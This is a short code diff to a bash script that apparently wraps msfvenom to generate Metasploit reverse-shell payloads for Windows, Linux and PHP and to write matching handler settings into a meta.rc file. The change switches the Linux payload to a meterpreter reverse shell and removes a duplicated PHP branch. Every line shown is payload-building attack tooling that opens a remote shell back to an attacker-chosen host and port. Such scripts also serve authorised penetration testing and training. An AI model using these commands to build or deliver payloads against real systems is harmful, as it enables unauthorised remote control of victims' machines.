@@ -24,11 +24,8 @@ if [[ "$payload" == "windows" || "$payload" == "exe" ]]; then
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $file.exe
         echo 'set payload windows/meterpreter/reverse_tcp' >> meta.rc
 elif [[ "$payload" == "linux" || "$payload" == "elf" ]]; then
-        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
-        echo 'set payload linux/x64/shell_reverse_tcp' >> meta.rc
-elif [ "$payload" == "php" ]; then
-        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
-        echo 'set payload linux/x64/shell_reverse_tcp' >> meta.rc
+        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
+        echo 'set payload linux/x64/meterpreter/reverse_tcp' >> meta.rc
 elif [ "$payload" == "php" ]; then
         msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $file.php
         echo 'set payload php/meterpreter_reverse_tcp' >> meta.rc
